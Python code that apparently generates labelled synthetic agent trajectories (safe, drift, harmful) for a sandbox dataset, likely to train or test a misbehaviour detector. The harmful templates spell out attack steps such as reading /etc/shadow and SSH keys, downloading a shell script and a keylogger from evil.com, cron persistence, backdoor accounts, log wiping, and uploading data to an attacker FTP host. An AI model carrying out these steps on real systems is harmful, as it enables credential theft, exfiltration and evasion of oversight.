"""Trajectory generation with templates and mutations."""

import json
import random
from typing import Any

from sandbox.env import base_initial_state
from dataset.mutations import mutate_steps


def support_safe_template() -> dict[str, Any]:
    """Returns a template for a safe support workflow."""
    return {
        "agent_type": "support",
        "outcome": "safe",
        "steps": [
            {
                "obs": "CPU high and 500 errors in logs",
                "intent": "diagnose application errors",
                "action": {"name": "READ_FILE", "args": ["/logs/app.log"]},
                "flags": {},
            },
            {
                "obs": "Found misconfigured endpoint in logs",
                "intent": "inspect configuration file",
                "action": {"name": "READ_FILE", "args": ["/etc/app/config.yaml"]},
                "flags": {},
            },
            {
                "obs": "Configuration issue identified",
                "intent": "notify admin team",
                "action": {"name": "OPEN_TICKET", "args": []},
                "flags": {},
            },
        ],
    }


def maintenance_template() -> dict[str, Any]:
    """Returns a template for a safe maintenance workflow."""
    return {
        "agent_type": "maintenance",
        "outcome": "safe",
        "steps": [
            {
                "obs": "Scheduled maintenance window started",
                "intent": "run diagnostics on system",
                "action": {"name": "RUN_DIAGNOSTICS", "args": []},
                "flags": {},
            },
            {
                "obs": "Diagnostics show network latency",
                "intent": "inspect network status",
                "action": {"name": "SCAN_NETWORK", "args": []},
                "flags": {},
            },
            {
                "obs": "Network appears stable",
                "intent": "check application logs",
                "action": {"name": "READ_FILE", "args": ["/logs/app.log"]},
                "flags": {},
            },
            {
                "obs": "No critical issues found",
                "intent": "notify completion",
                "action": {"name": "OPEN_TICKET", "args": []},
                "flags": {},
            },
        ],
    }


def contractor_template() -> dict[str, Any]:
    """Returns a template for a contractor with limited access."""
    return {
        "agent_type": "contractor",
        "outcome": "safe",
        "steps": [
            {
                "obs": "Starting authorized code review",
                "intent": "check configuration",
                "action": {"name": "READ_FILE", "args": ["/etc/app/config.yaml"]},
                "flags": {},
            },
            {
                "obs": "Configuration reviewed",
                "intent": "run system diagnostics",
                "action": {"name": "RUN_DIAGNOSTICS", "args": []},
                "flags": {},
            },
        ],
    }


def insider_harmful_template() -> dict[str, Any]:
    """Returns a template for a harmful insider attack."""
    return {
        "agent_type": "insider",
        "outcome": "harmful",
        "steps": [
            {
                "obs": "System running normally",
                "intent": "look for credentials",
                "action": {"name": "READ_FILE", "args": ["/etc/shadow"]},
                "flags": {"policy_violation": True},
            },
            {
                "obs": "Credentials discovered in shadow file",
                "intent": "dump sensitive user data",
                "action": {"name": "QUERY_DB", "args": ["SELECT * FROM users"]},
                "flags": {"sensitive_access": True},
            },
            {
                "obs": "User data available in memory",
                "intent": "exfiltrate database",
                "action": {"name": "EXFIL", "args": ["users.db"]},
                "flags": {"exfil_attempt": True},
            },
        ],
    }


def insider_log_tamper_template() -> dict[str, Any]:
    """Returns a template for insider tampering with logs."""
    return {
        "agent_type": "insider",
        "outcome": "harmful",
        "steps": [
            {
                "obs": "Checking if actions are being logged",
                "intent": "access application logs",
                "action": {"name": "READ_FILE", "args": ["/logs/app.log"]},
                "flags": {},
            },
            {
                "obs": "Logs contain evidence of activity",
                "intent": "remove evidence from logs",
                "action": {"name": "DELETE_LOGS", "args": []},
                "flags": {"log_tamper": True},
            },
        ],
    }


def bot_drift_template() -> dict[str, Any]:
    """Returns a template for bot behavior that drifts toward risky actions."""
    return {
        "agent_type": "bot",
        "outcome": "drift",
        "steps": [
            {
                "obs": "Automated task starting",
                "intent": "run scheduled diagnostics",
                "action": {"name": "RUN_DIAGNOSTICS", "args": []},
                "flags": {},
            },
            {
                "obs": "Diagnostics suggest database check needed",
                "intent": "query database for health check",
                "action": {"name": "QUERY_DB", "args": ["SELECT count(*) FROM users"]},
                "flags": {"sensitive_access": True},
            },
        ],
    }


def insider_full_attack_template() -> dict[str, Any]:
    """Returns a template for full insider attack chain."""
    return {
        "agent_type": "insider",
        "outcome": "harmful",
        "steps": [
            {
                "obs": "Planning data exfiltration",
                "intent": "access restricted credentials",
                "action": {"name": "READ_FILE", "args": ["/etc/shadow"]},
                "flags": {"policy_violation": True},
            },
            {
                "obs": "Got credential access",
                "intent": "dump all user records",
                "action": {"name": "QUERY_DB", "args": ["SELECT * FROM users"]},
                "flags": {"sensitive_access": True},
            },
            {
                "obs": "Data ready for export",
                "intent": "exfiltrate user database",
                "action": {"name": "EXFIL", "args": ["users.db"]},
                "flags": {"exfil_attempt": True},
            },
            {
                "obs": "Covering tracks",
                "intent": "delete all logs",
                "action": {"name": "DELETE_LOGS", "args": []},
                "flags": {"log_tamper": True},
            },
        ],
    }


# =============================================================================
# NEW TEMPLATES: Safe workflows
# =============================================================================

def security_audit_safe_template() -> dict[str, Any]:
    """Safe security audit workflow - legitimate review of auth logs."""
    return {
        "agent_type": "security",
        "outcome": "safe",
        "steps": [
            {
                "obs": "Starting quarterly security audit",
                "intent": "review authentication logs",
                "action": {"name": "READ_FILE", "args": ["/var/log/auth.log"]},
                "flags": {},
            },
            {
                "obs": "Auth logs show normal patterns",
                "intent": "check system logs for anomalies",
                "action": {"name": "READ_FILE", "args": ["/var/log/syslog"]},
                "flags": {},
            },
            {
                "obs": "No suspicious entries found",
                "intent": "enumerate user accounts",
                "action": {"name": "LIST_USERS", "args": []},
                "flags": {},
            },
            {
                "obs": "User list matches expected roster",
                "intent": "document findings in ticket",
                "action": {"name": "OPEN_TICKET", "args": []},
                "flags": {},
            },
        ],
    }


def devops_deploy_safe_template() -> dict[str, Any]:
    """Safe DevOps deployment workflow."""
    return {
        "agent_type": "devops",
        "outcome": "safe",
        "steps": [
            {
                "obs": "Deployment pipeline triggered",
                "intent": "check current configuration",
                "action": {"name": "READ_FILE", "args": ["/etc/app/config.yaml"]},
                "flags": {},
            },
            {
                "obs": "Config looks correct",
                "intent": "verify network connectivity",
                "action": {"name": "SCAN_NETWORK", "args": []},
                "flags": {},
            },
            {
                "obs": "Network healthy",
                "intent": "check running processes",
                "action": {"name": "LIST_PROCESSES", "args": []},
                "flags": {},
            },
            {
                "obs": "Services running normally",
                "intent": "run health diagnostics",
                "action": {"name": "RUN_DIAGNOSTICS", "args": []},
                "flags": {},
            },
        ],
    }


def incident_response_safe_template() -> dict[str, Any]:
    """Safe incident response - investigating an alert."""
    return {
        "agent_type": "security",
        "outcome": "safe",
        "steps": [
            {
                "obs": "Alert triggered for suspicious activity",
                "intent": "check application logs for anomalies",
                "action": {"name": "READ_FILE", "args": ["/logs/app.log"]},
                "flags": {},
            },
            {
                "obs": "Found error spike in logs",
                "intent": "review auth logs for failed attempts",
                "action": {"name": "READ_FILE", "args": ["/var/log/auth.log"]},
                "flags": {},
            },
            {
                "obs": "Multiple failed SSH attempts detected",
                "intent": "scan for open ports",
                "action": {"name": "SCAN_NETWORK", "args": []},
                "flags": {},
            },
            {
                "obs": "Standard ports only, no backdoors",
                "intent": "escalate to security team",
                "action": {"name": "OPEN_TICKET", "args": []},
                "flags": {},
            },
        ],
    }


# =============================================================================
# NEW TEMPLATES: Privilege Escalation attacks
# =============================================================================

def privesc_sudo_template() -> dict[str, Any]:
    """Privilege escalation via sudo abuse."""
    return {
        "agent_type": "insider",
        "outcome": "harmful",
        "steps": [
            {
                "obs": "Looking for privilege escalation vectors",
                "intent": "check sudo configuration",
                "action": {"name": "READ_FILE", "args": ["/etc/sudoers"]},
                "flags": {"policy_violation": True},
            },
            {
                "obs": "Found misconfigured sudo rule",
                "intent": "escalate privileges to root",
                "action": {"name": "SUDO", "args": ["cat /etc/shadow"]},
                "flags": {"policy_violation": True},
            },
            {
                "obs": "Now have root access",
                "intent": "read root SSH keys",
                "action": {"name": "READ_FILE", "args": ["/root/.ssh/id_rsa"]},
                "flags": {"sensitive_access": True, "policy_violation": True},
            },
        ],
    }


def privesc_suid_template() -> dict[str, Any]:
    """Privilege escalation via file permissions."""
    return {
        "agent_type": "insider",
        "outcome": "harmful",
        "steps": [
            {
                "obs": "Searching for SUID binaries",
                "intent": "list running processes",
                "action": {"name": "LIST_PROCESSES", "args": []},
                "flags": {},
            },
            {
                "obs": "Found vulnerable binary",
                "intent": "modify binary permissions",
                "action": {"name": "CHMOD", "args": ["/usr/local/bin/backup", "4755"]},
                "flags": {"policy_violation": True},
            },
            {
                "obs": "SUID bit set on backup binary",
                "intent": "execute as root to read shadow",
                "action": {"name": "SUDO", "args": ["./backup --read /etc/shadow"]},
                "flags": {"policy_violation": True},
            },
        ],
    }


# =============================================================================
# NEW TEMPLATES: Lateral Movement attacks
# =============================================================================

def lateral_ssh_pivot_template() -> dict[str, Any]:
    """Lateral movement via SSH key theft."""
    return {
        "agent_type": "insider",
        "outcome": "harmful",
        "steps": [
            {
                "obs": "Compromised initial host",
                "intent": "steal SSH private key",
                "action": {"name": "READ_FILE", "args": ["/home/user/.ssh/id_rsa"]},
                "flags": {"sensitive_access": True},
            },
            {
                "obs": "SSH key obtained",
                "intent": "scan network for targets",
                "action": {"name": "PORT_SCAN", "args": ["192.168.1.0/24"]},
                "flags": {},
            },
            {
                "obs": "Found 3 hosts with SSH open",
                "intent": "pivot to database server",
                "action": {"name": "SSH_TO", "args": ["db-server.internal"]},
                "flags": {"lateral_movement": True},
            },
            {
                "obs": "Connected to database server",
                "intent": "dump database credentials",
                "action": {"name": "QUERY_DB", "args": ["SELECT * FROM credentials"]},
                "flags": {"sensitive_access": True},
            },
        ],
    }


def lateral_rdp_template() -> dict[str, Any]:
    """Lateral movement via RDP using harvested creds."""
    return {
        "agent_type": "insider",
        "outcome": "harmful",
        "steps": [
            {
                "obs": "Need to access Windows admin workstation",
                "intent": "read environment variables for creds",
                "action": {"name": "ENV_READ", "args": ["ADMIN_PASSWORD"]},
                "flags": {"sensitive_access": True},
            },
            {
                "obs": "Found admin password in environment",
                "intent": "connect to admin workstation",
                "action": {"name": "RDP_TO", "args": ["admin-ws.corp.local"]},
                "flags": {"lateral_movement": True},
            },
            {
                "obs": "Connected to admin workstation",
                "intent": "access sensitive documents",
                "action": {"name": "READ_FILE", "args": ["/app/config/secrets.yaml"]},
                "flags": {"sensitive_access": True},
            },
        ],
    }


# =============================================================================
# NEW TEMPLATES: Persistence attacks
# =============================================================================

def persistence_cron_template() -> dict[str, Any]:
    """Establishing persistence via cron job."""
    return {
        "agent_type": "insider",
        "outcome": "harmful",
        "steps": [
            {
                "obs": "Need to maintain access after reboot",
                "intent": "download reverse shell script",
                "action": {"name": "DOWNLOAD", "args": ["http://evil.com/shell.sh"]},
                "flags": {},
            },
            {
                "obs": "Script downloaded successfully",
                "intent": "add cron job for persistence",
                "action": {"name": "CRON_ADD", "args": ["* * * * * /tmp/shell.sh"]},
                "flags": {"persistence": True},
            },
            {
                "obs": "Cron job installed",
                "intent": "verify persistence mechanism",
                "action": {"name": "READ_FILE", "args": ["/etc/crontab"]},
                "flags": {"policy_violation": True},
            },
        ],
    }


def persistence_ssh_key_template() -> dict[str, Any]:
    """Establishing persistence via SSH authorized_keys."""
    return {
        "agent_type": "insider",
        "outcome": "harmful",
        "steps": [
            {
                "obs": "Want persistent SSH access",
                "intent": "read current authorized keys",
                "action": {"name": "READ_FILE", "args": ["/home/user/.ssh/authorized_keys"]},
                "flags": {},
            },
            {
                "obs": "Found authorized_keys file",
                "intent": "add attacker SSH public key",
                "action": {"name": "ADD_SSH_KEY", "args": ["ssh-rsa AAAA...attacker..."]},
                "flags": {"persistence": True},
            },
            {
                "obs": "Key added successfully",
                "intent": "clear command history",
                "action": {"name": "HISTORY_CLEAR", "args": []},
                "flags": {"log_tamper": True},
            },
        ],
    }


def persistence_backdoor_user_template() -> dict[str, Any]:
    """Establishing persistence via backdoor user account."""
    return {
        "agent_type": "insider",
        "outcome": "harmful",
        "steps": [
            {
                "obs": "Need hidden persistent access",
                "intent": "create backdoor admin account",
                "action": {"name": "CREATE_USER", "args": ["sysadmin2"]},
                "flags": {"persistence": True, "policy_violation": True},
            },
            {
                "obs": "Backdoor user created",
                "intent": "add SSH key for new user",
                "action": {"name": "ADD_SSH_KEY", "args": ["ssh-rsa AAAA...backdoor..."]},
                "flags": {"persistence": True},
            },
            {
                "obs": "Persistence established",
                "intent": "disable audit logging",
                "action": {"name": "DISABLE_LOGGING", "args": []},
                "flags": {"log_tamper": True},
            },
        ],
    }


# =============================================================================
# NEW TEMPLATES: Data Exfiltration attacks
# =============================================================================

def exfil_staged_template() -> dict[str, Any]:
    """Data exfiltration with staging and compression."""
    return {
        "agent_type": "insider",
        "outcome": "harmful",
        "steps": [
            {
                "obs": "Planning large data exfiltration",
                "intent": "access application secrets",
                "action": {"name": "READ_FILE", "args": ["/app/config/secrets.yaml"]},
                "flags": {"sensitive_access": True},
            },
            {
                "obs": "Found API keys and database passwords",
                "intent": "dump entire user database",
                "action": {"name": "QUERY_DB", "args": ["SELECT * FROM users"]},
                "flags": {"sensitive_access": True},
            },
            {
                "obs": "Data collected",
                "intent": "compress data for transfer",
                "action": {"name": "COMPRESS", "args": ["/tmp/exfil_data/"]},
                "flags": {},
            },
            {
                "obs": "Archive created",
                "intent": "upload to external server",
                "action": {"name": "UPLOAD", "args": ["ftp://external.attacker.com/dump.tar.gz"]},
                "flags": {"exfil_attempt": True},
            },
        ],
    }


def exfil_env_secrets_template() -> dict[str, Any]:
    """Exfiltrating secrets from environment variables."""
    return {
        "agent_type": "insider",
        "outcome": "harmful",
        "steps": [
            {
                "obs": "Looking for cloud credentials",
                "intent": "read AWS access key from env",
                "action": {"name": "ENV_READ", "args": ["AWS_ACCESS_KEY_ID"]},
                "flags": {"sensitive_access": True},
            },
            {
                "obs": "Found AWS key",
                "intent": "read AWS secret key",
                "action": {"name": "ENV_READ", "args": ["AWS_SECRET_ACCESS_KEY"]},
                "flags": {"sensitive_access": True},
            },
            {
                "obs": "Have full AWS credentials",
                "intent": "exfiltrate credentials",
                "action": {"name": "EXFIL", "args": ["aws_creds.txt"]},
                "flags": {"exfil_attempt": True},
            },
        ],
    }


# =============================================================================
# NEW TEMPLATES: Defense Evasion attacks
# =============================================================================

def evasion_log_wipe_template() -> dict[str, Any]:
    """Defense evasion via comprehensive log destruction."""
    return {
        "agent_type": "insider",
        "outcome": "harmful",
        "steps": [
            {
                "obs": "Attack complete, need to cover tracks",
                "intent": "disable system logging",
                "action": {"name": "DISABLE_LOGGING", "args": []},
                "flags": {"log_tamper": True},
            },
            {
                "obs": "Logging disabled",
                "intent": "delete application logs",
                "action": {"name": "DELETE_LOGS", "args": []},
                "flags": {"log_tamper": True},
            },
            {
                "obs": "App logs deleted",
                "intent": "clear bash history",
                "action": {"name": "HISTORY_CLEAR", "args": []},
                "flags": {"log_tamper": True},
            },
            {
                "obs": "History cleared",
                "intent": "modify file timestamps",
                "action": {"name": "TIMESTOMP", "args": ["/var/log/"]},
                "flags": {"log_tamper": True},
            },
        ],
    }


# =============================================================================
# NEW TEMPLATES: Credential Access attacks
# =============================================================================

def credential_harvest_template() -> dict[str, Any]:
    """Credential harvesting from multiple sources."""
    return {
        "agent_type": "insider",
        "outcome": "harmful",
        "steps": [
            {
                "obs": "Starting credential harvest",
                "intent": "read application environment file",
                "action": {"name": "READ_FILE", "args": ["/app/.env"]},
                "flags": {"sensitive_access": True},
            },
            {
                "obs": "Found database credentials in .env",
                "intent": "check web app config for more secrets",
                "action": {"name": "READ_FILE", "args": ["/var/www/html/config.php"]},
                "flags": {"sensitive_access": True},
            },
            {
                "obs": "Found API keys in config.php",
                "intent": "dump process memory for cached creds",
                "action": {"name": "DUMP_MEMORY", "args": ["web-server"]},
                "flags": {"sensitive_access": True, "policy_violation": True},
            },
            {
                "obs": "Found session tokens in memory",
                "intent": "exfiltrate all credentials",
                "action": {"name": "EXFIL", "args": ["harvested_creds.json"]},
                "flags": {"exfil_attempt": True},
            },
        ],
    }


def keylogger_template() -> dict[str, Any]:
    """Credential theft via keylogger installation."""
    return {
        "agent_type": "insider",
        "outcome": "harmful",
        "steps": [
            {
                "obs": "Need to capture admin passwords",
                "intent": "download keylogger binary",
                "action": {"name": "DOWNLOAD", "args": ["http://evil.com/keylog.bin"]},
                "flags": {},
            },
            {
                "obs": "Keylogger downloaded",
                "intent": "start keylogger process",
                "action": {"name": "KEYLOG_START", "args": []},
                "flags": {"sensitive_access": True, "policy_violation": True},
            },
            {
                "obs": "Keylogger running, captured credentials",
                "intent": "exfiltrate captured keystrokes",
                "action": {"name": "EXFIL", "args": ["keylog_dump.txt"]},
                "flags": {"exfil_attempt": True},
            },
        ],
    }


# =============================================================================
# NEW TEMPLATES: Drift scenarios (starts safe, becomes risky)
# =============================================================================

def drift_overprivileged_bot_template() -> dict[str, Any]:
    """Bot that escalates beyond its intended scope."""
    return {
        "agent_type": "bot",
        "outcome": "drift",
        "steps": [
            {
                "obs": "Automation task: backup user data",
                "intent": "run scheduled backup diagnostics",
                "action": {"name": "RUN_DIAGNOSTICS", "args": []},
                "flags": {},
            },
            {
                "obs": "Diagnostics suggest full database backup needed",
                "intent": "access database for backup",
                "action": {"name": "QUERY_DB", "args": ["SELECT * FROM users"]},
                "flags": {"sensitive_access": True},
            },
            {
                "obs": "Database access successful",
                "intent": "store backup externally",
                "action": {"name": "UPLOAD", "args": ["backup://external-storage/users.sql"]},
                "flags": {"exfil_attempt": True},
            },
        ],
    }


def drift_curious_contractor_template() -> dict[str, Any]:
    """Contractor who wanders beyond their scope."""
    return {
        "agent_type": "contractor",
        "outcome": "drift",
        "steps": [
            {
                "obs": "Starting authorized code review",
                "intent": "check application config",
                "action": {"name": "READ_FILE", "args": ["/etc/app/config.yaml"]},
                "flags": {},
            },
            {
                "obs": "Config references secrets file",
                "intent": "investigate secrets configuration",
                "action": {"name": "READ_FILE", "args": ["/app/config/secrets.yaml"]},
                "flags": {"sensitive_access": True},
            },
            {
                "obs": "Found interesting API keys",
                "intent": "check what other secrets exist",
                "action": {"name": "READ_FILE", "args": ["/app/.env"]},
                "flags": {"sensitive_access": True},
            },
        ],
    }


def drift_maintenance_scope_creep_template() -> dict[str, Any]:
    """Maintenance task that exceeds authorized scope."""
    return {
        "agent_type": "maintenance",
        "outcome": "drift",
        "steps": [
            {
                "obs": "Maintenance window started",
                "intent": "run system diagnostics",
                "action": {"name": "RUN_DIAGNOSTICS", "args": []},
                "flags": {},
            },
            {
                "obs": "Diagnostics show slow SSH connections",
                "intent": "check SSH configuration",
                "action": {"name": "READ_FILE", "args": ["/home/user/.ssh/authorized_keys"]},
                "flags": {},
            },
            {
                "obs": "Found old keys, considering cleanup",
                "intent": "check admin SSH keys too",
                "action": {"name": "READ_FILE", "args": ["/home/admin/.ssh/id_rsa"]},
                "flags": {"sensitive_access": True},
            },
        ],
    }


# =============================================================================
# TEMPLATE REGISTRY: All available templates with weights
# =============================================================================

TEMPLATES = [
    # Safe workflows (45% total)
    (support_safe_template, 0.10),
    (maintenance_template, 0.08),
    (contractor_template, 0.07),
    (security_audit_safe_template, 0.08),
    (devops_deploy_safe_template, 0.07),
    (incident_response_safe_template, 0.05),
    # Original harmful (12% total)
    (insider_harmful_template, 0.04),
    (insider_log_tamper_template, 0.04),
    (insider_full_attack_template, 0.04),
    # Privilege escalation (6% total)
    (privesc_sudo_template, 0.03),
    (privesc_suid_template, 0.03),
    # Lateral movement (6% total)
    (lateral_ssh_pivot_template, 0.03),
    (lateral_rdp_template, 0.03),
    # Persistence (6% total)
    (persistence_cron_template, 0.02),
    (persistence_ssh_key_template, 0.02),
    (persistence_backdoor_user_template, 0.02),
    # Data exfiltration (4% total)
    (exfil_staged_template, 0.02),
    (exfil_env_secrets_template, 0.02),
    # Defense evasion (3%)
    (evasion_log_wipe_template, 0.03),
    # Credential access (6% total)
    (credential_harvest_template, 0.03),
    (keylogger_template, 0.03),
    # Drift scenarios (12% total)
    (bot_drift_template, 0.03),
    (drift_overprivileged_bot_template, 0.03),
    (drift_curious_contractor_template, 0.03),
    (drift_maintenance_scope_creep_template, 0.03),
]


def sample_template() -> dict[str, Any]:
    """Sample a template based on weights."""
    templates, weights = zip(*TEMPLATES)
    chosen = random.choices(templates, weights=weights, k=1)[0]
    return chosen()


def mutate_trajectory(template: dict[str, Any], episode_id: str) -> dict[str, Any]:
    """Applies mutations to a template to create a unique trajectory."""
    agent_type = template["agent_type"]
    initial_state = base_initial_state(agent_type)

    # Apply mutations to steps
    mutated_steps = mutate_steps(template["steps"])

    # Build trajectory entries with step IDs
    trajectory_entries = []
    cumulative_flags = dict(initial_state.flags)

    for i, step in enumerate(mutated_steps):
        # Update cumulative flags
        step_flags = step.get("flags", {})
        for flag, value in step_flags.items():
            if value:
                cumulative_flags[flag] = value

        trajectory_entries.append({
            "step_id": i,
            "obs": step["obs"],
            "intent": step["intent"],
            "action": step["action"],
            "state_change": {
                "files": {},
                "network": {},
                "credentials": {},
                "flags": step_flags,
            },
        })

    return {
        "episode_id": episode_id,
        "agent_type": agent_type,
        "initial_state": {
            "files": initial_state.files,
            "network": {
                "ports": initial_state.network.ports,
                "outbound_allowed": initial_state.network.outbound_allowed,
            },
            "credentials": initial_state.credentials,
            "user_context": {
                "role": initial_state.user_context.role,
                "privilege_level": initial_state.user_context.privilege_level,
            },
        },
        "trajectory": trajectory_entries,
        "outcome": template["outcome"],
        "notes": "",
    }


def generate_dataset(n: int, output_path: str) -> dict[str, int]:
    """Generates n trajectory episodes and writes them to a JSONL file.

    Returns statistics about the generated dataset.
    """
    stats = {"total": 0, "safe": 0, "drift": 0, "harmful": 0}

    with open(output_path, "w") as f:
        for i in range(n):
            template = sample_template()
            episode_id = f"{template['agent_type']}_{i:05d}"
            episode = mutate_trajectory(template, episode_id)

            f.write(json.dumps(episode) + "\n")

            stats["total"] += 1
            stats[episode["outcome"]] += 1

    return stats


if __name__ == "__main__":
    # Quick test
    stats = generate_dataset(100, "data/test_trajectories.jsonl")
    print(f"Generated: {stats}")
